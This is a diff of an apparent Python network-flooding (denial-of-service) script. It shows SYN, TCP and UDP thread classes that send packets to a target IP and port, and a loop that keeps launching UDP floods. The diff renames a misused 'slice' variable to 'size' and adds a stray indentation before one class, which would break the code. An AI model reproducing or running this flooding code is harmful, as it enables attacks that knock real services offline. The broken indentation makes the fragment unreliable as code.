@@ -55,7 +55,7 @@ time.sleep(5),
 print("\033[95m                         ⟩⟩  E \033[0m "),
 time.sleep(5),
 
-class syn(threading.Thread):
+        class syn(threading.Thread):
     def __init__(self, ip, port, packets):
         self.ip = ip
         self.port = port
@@ -70,10 +70,10 @@ class syn(threading.Thread):
                 pass
 
 class tcp(threading.Thread):
-    def __init__(self, ip, port, slice, packets):
+    def __init__(self, ip, port, size, packets):
         self.ip = ip
         self.port = port
-        self.size = slice
+        self.size = size
         self.packets = packets
         self.tcp = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         threading.Thread.__init__(self)
@@ -91,7 +91,7 @@ class udp(threading.Thread):
     def __init__(self, ip, port, size, packets):
         self.ip = ip
         self.port = port
-        self.size = slice
+        self.size = size
         self.packets = packets
         self.udp = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
         threading.Thread.__init__(self)
@@ -107,7 +107,7 @@ class udp(threading.Thread):
 
 while True:
     try:
-        if slice > 65507:
+        if size > 65507:
             sys.exit("Invalid Number Of Packets!")
         u = udp(ip,port,size,packets)
         u.start()
